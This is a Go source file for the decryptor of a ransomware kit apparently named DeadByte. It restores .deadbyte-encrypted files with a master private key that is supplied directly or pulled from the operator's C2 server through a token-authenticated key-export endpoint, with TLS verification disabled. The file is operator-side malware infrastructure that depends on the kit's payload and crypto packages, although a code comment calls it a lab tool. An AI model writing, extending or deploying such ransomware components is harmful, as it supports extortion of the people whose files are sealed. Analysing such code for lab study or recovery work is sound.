// DeadByte decryptor: restores files sealed by the payload using the master
// private key (provided directly or fetched from the C2).
package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"deadbyte/internal/crypto"
	"deadbyte/internal/types"
	"deadbyte/internal/walker"
)

var (
	flagKey     = flag.String("key", "", "master private key (base64)")
	flagC2      = flag.String("c2", "", "C2 base URL to fetch the master key from")
	flagToken   = flag.String("token", "", "admin token (required with -c2)")
	flagSecret  = flag.String("master-secret", os.Getenv("DEADBYTE_MASTER_SECRET"), "master secret to unlock the key (optional with -c2)")
	flagDirs    = flag.String("dirs", ".", "comma-separated directories to scan")
	flagDryRun  = flag.Bool("dry-run", false, "verify files and keys only; do not write")
	flagVerbose = flag.Bool("verbose", false, "verbose output")
	flagOut     = flag.String("out", "", "mirror directory: write restored files here, keep originals")
	flagDelete  = flag.Bool("delete", false, "delete the .deadbyte file after a successful in-place restore")
)

func main() {
	flag.Parse()
	logf := func(f string, a ...any) {
		if *flagVerbose {
			fmt.Printf("[decryptor] "+f+"\n", a...)
		}
	}

	master, err := loadMasterKey()
	if err != nil {
		fatalf("master key: %v", err)
	}

	roots := []string{}
	for _, d := range strings.Split(*flagDirs, ",") {
		d = strings.TrimSpace(d)
		if d != "" {
			roots = append(roots, d)
		}
	}
	if len(roots) == 0 {
		fatalf("no directory given in -dirs")
	}

	opts := walker.Options{
		Roots:    roots,
		ExtAllow: map[string]bool{types.Ext: true},
		ExtDeny:  nil,
		MaxSize:  0,
	}
	found, err := walker.Walk(opts, func(path string, size int64) error {
		ok, orig, rerr := restoreOne(master, path, logf)
		if rerr != nil {
			fmt.Printf("ERROR %s: %v\n", path, rerr)
			return nil
		}
		if ok {
			fmt.Printf("OK    %s -> %s\n", path, orig)
		}
		return nil
	})
	if err != nil {
		logf("walk: %v", err)
	}
	fmt.Printf("decryptor: found %d .deadbyte files\n", found)
}

func fatalf(f string, a ...any) {
	fmt.Fprintf(os.Stderr, "decryptor: "+f+"\n", a...)
	os.Exit(1)
}

func loadMasterKey() (any, error) {
	if *flagKey != "" {
		return crypto.ParsePrivB64(*flagKey)
	}
	if *flagC2 != "" {
		if *flagToken == "" {
			return nil, fmt.Errorf("-token is required with -c2")
		}
		url := strings.TrimSuffix(*flagC2, "/") + "/api/v1/key/export"
		body := bytes.NewReader([]byte("{}"))
		req, err := http.NewRequest(http.MethodPost, url, body)
		if err != nil {
			return nil, err
		}
		req.Header.Set("Authorization", "Bearer "+*flagToken)
		req.Header.Set("Content-Type", "application/json")
		if *flagSecret != "" {
			req.Header.Set("X-Master-Secret", *flagSecret)
		}
		tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} // #nosec G402 -- lab tool
		hc := &http.Client{Transport: tr, Timeout: 15 * time.Second}
		resp, err := hc.Do(req)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		if resp.StatusCode != http.StatusOK {
			return nil, fmt.Errorf("export: HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(data)))
		}
		var out struct {
			PrivateKey string `json:"private_key"`
		}
		if err := json.Unmarshal(data, &out); err != nil {
			return nil, err
		}
		if out.PrivateKey == "" {
			return nil, fmt.Errorf("export: response has no private_key")
		}
		return crypto.ParsePrivB64(out.PrivateKey)
	}
	return nil, fmt.Errorf("informe -key ou -c2")
}

func restoreOne(master any, path string, logf func(string, ...any)) (bool, string, error) {
	mk := master.(*ecdh.PrivateKey)
	// --- dry run / metadata probe ---
	orig, err := crypto.OpenFileHeader(mk, path)
	if err != nil {
		return false, "", err
	}
	orig = filepath.Base(orig) // never allow traversal
	if orig == "" {
		return false, "", fmt.Errorf("empty original name")
	}
	if *flagDryRun {
		logf("dry-run: %s -> %s", path, orig)
		return true, orig, nil
	}

	// --- mirror mode ---
	if *flagOut != "" {
		rel := relToRoot(path, *flagDirs)
		outPath := filepath.Join(*flagOut, filepath.Dir(rel), orig)
		if err := os.MkdirAll(filepath.Dir(outPath), 0o755); err != nil {
			return false, "", err
		}
		if _, err := crypto.DecryptFile(mk, path, outPath); err != nil {
			return false, "", err
		}
		return true, outPath, nil
	}

	// --- in-place restore: decrypt to temp, then swap ---
	dir := filepath.Dir(path)
	tmp := filepath.Join(dir, fmt.Sprintf(".dbd-restore-%d-%d", os.Getpid(), time.Now().UnixNano()))
	if _, err := crypto.DecryptFile(mk, path, tmp); err != nil {
		os.Remove(tmp)
		return false, "", err
	}
	dest := filepath.Join(dir, orig)
	if dest == path {
		os.Remove(tmp)
		return false, "", fmt.Errorf("destination is the encrypted file itself")
	}
	if _, err := os.Lstat(dest); err == nil {
		// collision: keep both, generate an alternative name
		dest = filepath.Join(dir, fmt.Sprintf("%s.restored-%d%s", strings.TrimSuffix(orig, filepath.Ext(orig)), time.Now().Unix(), filepath.Ext(orig)))
	}
	if err := os.Rename(tmp, dest); err != nil {
		os.Remove(tmp)
		return false, "", err
	}
	if *flagDelete {
		if err := os.Remove(path); err != nil {
			logf("warning: could not remove %s: %v", path, err)
		}
	}
	return true, dest, nil
}

// relToRoot resolves the path relative to the first matching root from -dirs.
func relToRoot(path, dirs string) string {
	abs, _ := filepath.Abs(path)
	for _, d := range strings.Split(dirs, ",") {
		d = strings.TrimSpace(d)
		if d == "" {
			continue
		}
		rd, _ := filepath.Abs(d)
		if rel, err := filepath.Rel(rd, abs); err == nil && !strings.HasPrefix(rel, "..") {
			return rel
		}
	}
	return filepath.Base(abs)
}
